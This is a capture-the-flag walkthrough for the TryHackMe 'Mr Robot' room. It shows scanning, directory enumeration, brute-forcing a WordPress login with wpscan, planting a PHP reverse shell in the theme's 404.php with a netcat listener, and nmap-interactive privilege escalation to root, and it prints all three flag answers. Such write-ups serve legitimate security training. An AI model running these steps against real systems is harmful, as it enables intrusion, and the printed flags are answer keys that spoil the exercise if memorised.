# [Mr Robot CTF](https://tryhackme.com/room/mrrobot)

> Based on the Mr. Robot show, can you root this box?

## Scanning

scan the machine

```
nmap -sS -sV -sC -T4 10.10.176.209
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b52092dc-9877-4110-bc1a-a5f5a3441f28)

## HTTP

view the webpage, it appears a mr robot terminal and a list of command for you try

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/95275df3-8f99-4ab8-ac88-f9bc19d04798)

view source

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/662ff39d-e3c9-4d26-9970-d7ba8dd7ea04)

i think about mr robot, let's check robots.txt

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b823aac9-351c-493d-ae4f-12db8af61918)

we have a dictionary file `fsocity.dic`, maybe a list of password for later, and our flag 1

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5f19aee5-0f06-47a8-bd68-3d0cf07f78d6)

| Flag | key-1-of-3.txt |
| --- | --- |
| Answer | 073403c8a58a1f80d943455fb30724b9 |

## Enumeration

enum the directory of webpage

```
gobuster dir -u http://10.10.176.209 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e4794fb1-53f4-4095-a078-1d77b720fb6b)

it's seem a wordpress site and a wp-login panel

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c9296a24-4734-4123-ab30-46cea686cacb)

after research, i know that mr robot's name is `elliot`, so i think it's our username

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4b640f50-9533-4564-bd49-d68c5c2cb813)

before do a bruteforce, the givin wordlist contain 858,161 lines, so lets sort it out and remove duplicates

```
sort fsocity.dic | uniq > sorted_fsociety.dic
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d71f3244-8630-49bb-bfb1-74e5867dd753)

## Exploitation

now you can bruteforce the credentials by using `hydra`

but i will use `wpscan` to attack this wordpress site

```
wpscan --url http://10.10.176.209/wp-login -U elliot -P sorted_fsociety.dic -t 30
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/77561662-ad9c-4b46-95dd-eb6422ae4d6c)

we now successfully gained access to the WordPress Panel

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/74954412-f0e2-498b-a144-4d70af2f7ddb)

now upload a php reverse shell to gain access

```
cp /usr/share/webshells/php/php-reverse-shell.php .
vi php-reverse-shell.php
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9a3bc467-ac19-40c9-8ce2-a2ff74fe56cb)

i update the 404.php with our reverse shell

```
nc -vlnp 1234
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e6e4e26d-8494-46e9-894c-97ea21072686)

upgrade the shell

```

```

at /home/robot, i see the flag 2 and a md5 password of robot

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/421ead71-09cc-4b03-9954-90eb2115be72)

crack the password

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4f3da1f0-65b6-451e-8e97-bda3d142103a)

here you go, flag 2

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8bebaa75-ba68-4521-9bee-f6d7e0f29119)

| Flag | key-2-of-3.txt |
| --- | --- |
| Answer | 822c73956184f694993bede3eb39f959 |

## Privilege Escalation

finding suid bit

```
find / -perm /4000 2>/dev/null
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cab3ab4e-dda1-4dbd-a287-d631255ac579)

leverage the nmap to get root

```
nmap --interactive
!sh
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ee12dfcf-ed19-4e42-8890-a52561c7f3e6)

| Flag | key-3-of-3.txt |
| --- | --- |
| Answer | 04787ddef27c3dee1ee161b21670b4e4 |
